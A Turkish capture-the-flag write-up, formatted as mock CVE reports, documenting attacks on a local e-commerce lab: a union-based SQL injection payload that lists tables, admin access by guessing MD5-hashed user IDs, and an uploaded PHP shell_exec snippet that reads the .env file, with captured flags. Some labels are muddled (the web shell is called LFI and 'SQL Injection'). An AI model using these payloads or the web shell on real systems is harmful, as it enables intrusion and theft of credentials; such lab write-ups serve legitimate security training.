# CTF1 - Rapor

### CVE-2025-XXF1 – Union-Based SQL Injection Zafiyeti

| **Bilgi**                | **Detay**                         |
|--------------------------|-----------------------------------|
| **Zafiyet Adı**          | Union-Based SQL Injection         |
| **CVE Numarası**         | CVE-2025-XXF1                     |
| **Yayın Tarihi**         | 22.03.2025                        |
| **Etkilenen Sistem**     | Ticaret Sitesi Veritabanı         |
| **Zafiyet Seviyesi**     | Kritik (CVSS: 9.8)                |
| **Raporlayan**           | Ak Takkeli Burak                  |

##### Açıklama:
CVE-2025-XXF1, asd' UNION SELECT ... şeklinde gerçekleştirilebilen bir Union-based SQL Injection zafiyetidir. Bu zafiyet, kullanıcı girişlerinin uygun şekilde filtrelenmesi nedeniyle, saldırganın veritabanında bulunan tabloları sızdırmasına olanak tanımaktadır.
Saldırgan, aşağıdaki gibi bir payload ile veritabanındaki tablo adlarına erişim sağlayabilmektedir ⇒ 
asd' UNION SELECT 'i', table_name, NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema=database()-- ASD

##### Kanıt ⇒ 
Bu zafiyetin başarılı bir şekilde sömürülmesi sonucu YZT_FLAG1{b2e605ed389aef58002aa7132ad26d98} gibi hassas verilere erişim sağlanabilmiştir.

-------------------------------------

### CVE-2025-XXF2 – MD5 Hash ile Yetkisiz Erişim (SQL Injection)
| **Bilgi**                | **Detay**                         |
|--------------------------|-----------------------------------|
| **Zafiyet Adı**          | SQL Injection ve MD5 Hash         |
| **CVE Numarası**         | CVE-2025-XXF2                     |
| **Yayın Tarihi**         | 22.03.2025                        |
| **Etkilenen Sistem**     | Ticaret Sitesi Veritabanı         |
| **Zafiyet Seviyesi**     | Kritik (CVSS: 9.8)                |
| **Raporlayan**           | Ak Takkeli Burak                  |

##### Açıklama:
Uygulamada user_id parametresi MD5 hashlenmiş kullanıcı ID si üzerinden kontrol edilmekte.
MD5 gibi zayıf bir algoritmanın kullanılması ve herhangi bir ek doğrulama yapılmaması, saldırganların belirli ID’lere karşılık gelen sabit MD5 hashlerini deneyerek yetkisiz erişim sağlamalarına olanak tanımaktadır.

    1 → c4ca4238a0b923820dcc509a6f75849b
    4 → a87ff679a2f3e71d9181a67b7542122c 

##### Aşağıdaki istek ile 1 numaralı kullanıcının bilgilerine erişim sağlanabilmektedir:

```http 
GET /admin/user_info.php?user_id=c4ca4238a0b923820dcc509a6f75849b HTTP/1.1 
```

##### Kanıt:
Bu Zafiyet Sayesinde MD5 şifrelemesi ile 1 numaralı admin kullanıcısına ulaşılması sonucu
YZT_FLAG2{998be3c05163e29054a6a0a82afd6435} gibi hassas verilerin erişim sağlanabilmiştir.


-------------------------------------

### CVE-2025-XXF3 – Local File Inclusion (LFI) ile .env Dosyasına Yetkisiz Erişim

- Yayın Tarihi: 22.03.2025
- Başlık: PHP shell_exec() Fonksiyonu ile Local File Inclusion (LFI) Zafiyeti
- Etkilenen Uygulama: Ticaret Sitesi Veritabanı
- URL: http://localhost:8081/admin/uploads/patatest.php
- Zafiyet Türü: SQL İnjection
- Raporlayan: Ak Takkeli Burak
- Açıklama:
Bu güvenlik açığı, PHP'nin shell_exec() fonksiyonunun kötüye kullanılması nedeniyle Local File Inclusion (LFI) zafiyeti yaratmaktadır. Uygulamada cat ../../.env komutu çalıştırılarak hassas bilgilerin açığa çıkmasına sebep olmaktadır.
Bu durum, saldırganların sunucudaki .env dosyasını okuyarak veritabanı bağlantı bilgileri, API anahtarları, gizli kimlik bilgileri gibi kritik verilere erişmesine neden olabilir.

```markdown
<?php
$output = shell_exec('cat ../../.env');
echo "<pre>$output</pre>";
?>
```

```http
GET /admin/uploads/patatest.php HTTP/1.1
Host: localhost:8081
sec-ch-ua: "Not:A-Brand";v="24", "Chromium";v="134"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: tr-TR,tr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=3dc3ed0ed831f473ad06fb91b7b19e51
Connection: keep-alive
```

- Kanıt ⇒ 
Bu zafiyetin başarılı bir şekilde sömürülmesi sonucu 
YZT_FLAG3{0d466c517e6437c8f6195e90fb3b7c2d} gibi hassas verilere erişim sağlanabilmiştir.
